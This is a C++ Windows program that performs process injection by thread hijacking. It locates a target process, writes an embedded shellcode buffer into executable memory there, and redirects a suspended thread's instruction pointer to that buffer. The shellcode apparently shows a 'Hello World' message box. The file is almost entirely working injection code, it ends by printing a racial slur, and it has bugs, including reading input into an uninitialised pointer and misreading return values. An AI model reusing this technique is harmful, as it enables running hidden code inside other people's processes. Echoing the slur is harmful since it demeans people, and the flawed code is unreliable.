#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

using namespace std;

int GetPid(const char* ProcessName) {
	int pid = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hSnapshot) {
		cout << "failed to take a snapshot to all the processes in the system\n";
		return GetLastError();
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	BOOL result = Process32First(hSnapshot, &pe32);
	if (!result) {
		cout << "failed to retrieve about the first process in the system snapshot" << endl;
		return GetLastError();
	}

	while (result) {
		if (strcmp(ProcessName, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
		result = Process32Next(hSnapshot, &pe32);
	}
	CloseHandle(hSnapshot);

	return pid;
}

unsigned char BufferEx[] =
"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
"\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
"\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
"\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
"\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
"\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
"\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
"\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
"\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
"\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
"\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
"\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
"\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
"\x54\x53\xff\xd6\x57\xff\xd0";

int main(void) {

	char* ProcessName;
	int pid = 0;
	cout << "[+] Process Name : ";
	cin >> ProcessName;
	pid = GetPid(ProcessName);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);
	if (!hProcess) {
		cout << "failed to open " << ProcessName << endl;
		return GetLastError();
	}
	
	void* AllocMem = VirtualAllocEx(hProcess, NULL, sizeof(BufferEx), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!AllocMem) {
		cout << "failed to allocate some executable memory in " << ProcessName << endl;
		return GetLastError();
	}

	BOOL wpm = WriteProcessMemory(hProcess, AllocMem, BufferEx, sizeof(BufferEx), 0);
	if (!wpm) {
		cout << "failed to write the shellcode into the allocated memory of " << ProcessName << endl;
		return GetLastError();
	}

	HANDLE hThread;

	THREADENTRY32 te32;
	te32.dwSize = sizeof(te32);

	CONTEXT co;
	co.ContextFlags = CONTEXT_FULL;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (Thread32First(hSnapshot, &te32)) {
		do {
			if (pid == te32.th32OwnerProcessID) {
				hThread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
				if (!hThread) {
					cout << "failed to open the thread" << endl;
					return GetLastError();
				}
				break;
			}
		} while (Thread32Next(hSnapshot, &te32));
	}

	DWORD SuspendTheShit = SuspendThread(hThread);
	if (!SuspendTheShit) {
		cout << "failed to suspend the thread" << endl;
		return GetLastError();
	}

	BOOL GtC = GetThreadContext(hThread, &co);
	if (!GtC) {
		cout << "failed to retrieve the context of the current thread" << endl;
		return GetLastError();
	}

	cout << "[+] EIP : " << co.Eip << endl;
	co.Eip = (DWORD)AllocMem;
	cout << "[+] Updated EIP : " << co.Eip << endl;

	BOOL StC = SetThreadContext(hThread, &co);
	if (!StC) {
		cout << "failed to set the context for the current thread" << endl;
		return GetLastError();
	}

	DWORD ResumeTheShit = ResumeThread(hThread);
	if (!ResumeTheShit) {
		cout << "failed to resume the current thread" << endl;
		return GetLastError();
	}
	
	cout << "i did it nigger" << endl;
	return 0;
}
